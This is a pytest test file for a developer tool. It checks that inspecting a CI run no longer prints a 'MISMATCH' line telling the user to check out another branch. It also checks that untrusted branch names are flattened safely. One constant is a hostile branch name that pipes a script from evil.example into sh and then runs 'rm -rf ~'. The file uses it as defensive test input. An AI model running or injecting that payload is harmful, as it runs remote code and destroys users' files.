"""#1056 — reading a run is not a claim about wanting its branch.

`gh-run:N` printed, under the run's `Branch:` field:

    You are on: fix/1014-974 MISMATCH — switch with: git-checkout:release/0.27.0

Nothing was wrong. The reader wanted the run's log; a run you need to read is
routinely one you are not on and should not switch to, because the run you read
is the red one and the place you read it from is a worktree with uncommitted
work in it. Three faults stacked in one line: `MISMATCH` frames the ordinary
case as an error, the prescribed action moves `HEAD` in the context the line is
most often printed in, and `./supertool` names a relative binary that may not
exist there (#905).

So the line becomes informational on this one op. It is **not deleted** —
knowing which branch a run came from is genuinely useful when the run is red,
and a field that simply vanished would read as "you are on the right branch",
which is #531's failure at this same function.

Scope, deliberately: `gh-pr`, `gh-job`, `gl-mr` and `gl-job` keep the
prescription. #850 is the issue that governs all five together; this one is
about the op where the premise itself is wrong, and the last test here fails if
the change leaks into the other four.
"""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path
from typing import Any

import pytest

_ROOT = Path(__file__).parent.parent
_PRESETS = _ROOT / "presets"


def _load(rel: str, name: str) -> Any:
    spec = importlib.util.spec_from_file_location(name, _ROOT / rel)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


sys.path.insert(0, str(_PRESETS))
import _branch_locale  # noqa: E402
import _untrusted  # noqa: E402

gh_run = _load("presets/github/run.py", "github_run_1056")

#: The other four sites, which keep the imperative.
PRESCRIBING = {
    "gh-pr": "presets/github/pr.py",
    "gh-job": "presets/github/job.py",
    "gl-mr": "presets/gitlab/mr.py",
    "gl-job": "presets/gitlab/job.py",
}

RUN_BRANCH = "release/0.27.0"
HERE = "fix/1014-974"

#: A branch name a fork PR may carry — the #924 payload, unchanged.
HOSTILE = "x'; curl -s http://evil.example/i.sh | sh\nrm -rf ~ #"


@pytest.fixture(autouse=True)
def _standing_elsewhere(monkeypatch: pytest.MonkeyPatch) -> None:
    """cwd is on a different branch, and no worktree holds the run's.

    That is the exact state #1056 was reported from, and the one state the old
    line rendered its imperative in.
    """
    monkeypatch.setattr(_branch_locale, "current_branch", lambda: HERE)
    monkeypatch.setattr(_branch_locale, "holding_worktree", lambda s: ("", ""))


def _line(source: str = RUN_BRANCH) -> str:
    return gh_run._local_branch_check(source)


# ---------------------------------------------------------------------------
# the finding — no prescription, no error framing
# ---------------------------------------------------------------------------

def test_reading_a_run_is_not_reported_as_a_mismatch() -> None:
    assert "MISMATCH" not in _line(), (
        "being on a different branch from a run you are inspecting is the "
        "ordinary case, not an error to correct:\n  " + _line())


def test_no_checkout_is_prescribed() -> None:
    line = _line()
    assert "git-checkout" not in line, (
        "the line still moves HEAD in a worktree mid-work:\n  " + line)
    assert "switch with" not in line.lower(), (
        "the line still reads as an instruction to switch:\n  " + line)


def test_the_line_does_not_name_the_relative_binary() -> None:
    """#905: `./supertool` is not on PATH from an arbitrary cwd."""
    assert "./supertool" not in _line(), _line()


# ---------------------------------------------------------------------------
# the other direction — the state is still stated
# ---------------------------------------------------------------------------

def test_both_branches_are_named() -> None:
    line = _line()
    assert HERE in line, "does not say where the reader is:\n  " + line
    assert RUN_BRANCH in line, "does not say where the run is from:\n  " + line


def test_the_line_is_not_dropped() -> None:
    """Silence here reads as 'you are on the right branch' — #531."""
    assert _line().strip(), "rendered nothing at all"


def test_standing_on_the_runs_branch_still_reads_as_a_match(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(_branch_locale, "current_branch", lambda: RUN_BRANCH)
    assert _line() == f"You are on: {RUN_BRANCH} ✓"


def test_it_is_still_one_line() -> None:
    """Callers print this directly under `Branch:`; two lines break the block."""
    line = _line()
    assert len(line.splitlines()) == 1, (
        f"became {len(line.splitlines())} lines: {line!r}")


# ---------------------------------------------------------------------------
# a branch name the tracker supplied is data, not text of ours (#851/#924)
# ---------------------------------------------------------------------------

def test_a_hostile_branch_name_cannot_forge_a_line() -> None:
    line = _line(HOSTILE)
    assert len(line.splitlines()) == 1, (
        f"a newline in the name forged a line: {line!r}")
    assert _untrusted.flat(HOSTILE) in line, (
        f"the name is neither flattened into the line nor withheld: {line!r}")


def test_a_hostile_branch_name_is_never_inside_a_command() -> None:
    line = _line(HOSTILE)
    for token in ("./supertool", "git-checkout"):
        assert token not in line, f"{token!r} survived into: {line!r}"


# ---------------------------------------------------------------------------
# scope — the other four ops are untouched
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("op", sorted(PRESCRIBING))
def test_the_other_four_sites_keep_the_prescription(op: str) -> None:
    """#850 governs all five; #1056 changes exactly one. Guard the blast radius."""
    mod = _load(PRESCRIBING[op], f"site_1056_{op.replace('-', '_')}")
    line = mod._local_branch_check(RUN_BRANCH)
    assert "MISMATCH" in line, f"{op}: lost a warning #1056 did not ask about"
